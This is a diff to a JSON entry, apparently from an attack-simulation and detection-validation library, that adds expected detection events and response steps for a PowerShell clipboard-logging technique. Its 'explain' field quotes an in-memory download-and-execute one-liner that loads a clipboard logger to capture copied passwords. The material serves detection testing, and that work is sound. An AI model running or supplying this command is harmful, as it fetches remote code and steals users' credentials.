@@ -138,6 +138,30 @@
         "edr",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "powershell",
+          "description": "Interacting with Users - Clipboard Logger - Sentinel"
+        },
+        {
+          "source": "powershell",
+          "event_id": "4104",
+          "description": "PowerShell script block logging"
+        },
+        {
+          "source": "windows-security",
+          "description": "posh_ps_invoke_clipboard_logger"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review PowerShell Script Block / Module Logs, Windows Security Event Log for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Captures clipboard contents over time to catch copied passwords:\n  IEX(New-Object Net.WebClient).DownloadString('...Invoke-Clipboard.ps1')   fetch and load the logger in memory\n  Invoke-ClipboardLogger   start recording every clipboard change\nUsers frequently copy/paste passwords, so an active session often yields plaintext credentials."
